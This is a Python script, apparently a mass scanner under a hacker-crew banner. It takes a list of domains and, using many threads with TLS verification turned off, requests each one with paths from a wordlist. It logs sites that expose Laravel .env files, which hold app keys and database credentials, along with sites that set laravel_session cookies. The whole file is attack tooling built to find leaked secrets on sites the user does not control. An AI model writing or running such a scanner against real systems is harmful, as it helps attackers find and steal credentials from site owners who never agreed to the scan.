import requests
from multiprocessing.dummy import Pool
import os

requests.packages.urllib3.disable_warnings()


def banner():
    print(
        """
  _                       
 | |                      
 | | __ _ _ __ __ ___   __
 | |/ _` | '__/ _` \ \ / /
 | | (_| | | | (_| |\ V / 
 |_|\__,_|_|  \__,_| \_/  
                          
	(+) Multipath ENV
	(+) Debug ENV
	(+) Laravel Cookie
Family Attack Cyber ~ Tatsumi Crew                           
		"""
    )  # Coded by ayanchakrabortty
   


def sabar(varnya):

    if "://" not in varnya:
        url = "http://" + varnya
    else:
        url = varnya

    try:
        ses = requests.Session()
        response = ses.get(url)
        yoo = response.cookies.get_dict()
        pat = open("path.txt", "r").readlines()
        for i in pat:
            blek = i.strip()
            r = requests.get("{}{}".format(url, blek), verify=False)

            if "APP_URL=" in r.text:
                print(url, "-> VALID ENV")
                open("validenv.txt", "a").write(url + blek + "\n")
                break
            elif "laravel_session" in yoo:
                print(url, "-> VALID COOKIE")
                open("validcookie.txt", "a").write(url + "\n")
                break
            else:
                print(url + blek, "-> NOT FOUND!")

    except Exception:
        pass


def thread(ye):
    banh = open(ye, "r").read().splitlines()
    mak = input("Set Threads -> ")
    p = Pool(int(mak))
    p.map(sabar, banh)


if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    banner()

    helow = input("Your Domain list -> ")
    thread(helow)
